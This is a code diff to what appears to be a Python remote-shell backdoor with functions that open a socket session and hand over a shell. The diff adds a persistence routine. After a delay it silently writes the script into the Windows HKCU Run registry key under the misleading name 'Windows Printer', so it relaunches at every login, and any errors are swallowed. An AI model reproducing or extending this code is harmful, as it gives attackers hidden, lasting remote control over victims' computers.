@@ -6,7 +6,7 @@ import platform
 import subprocess
 from time import sleep
 import requests
-from sqlalchemy.ext.declarative.api import _stateful_declared_attr
+from threading import Thread
 
 
 def shell(sock):
@@ -29,12 +29,26 @@ def session(ip, port):
         shell(sock)
 
     except Exception as err:
-        #print(err)
+        # print(err)
         return 0
+
+
+def autorun(file):
+    sleep(60)
+    try:
+        if platform.system() == 'Windows':
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0,
+                                 winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, 'Windows Printer', 0, winreg.REG_SZ, file)
+    except:
+        pass
 
 
 # Função principal
 if __name__ == '__main__':
+
+    Thread(target=autorun, args=(__file__,)).start()
 
     while True:
         try:
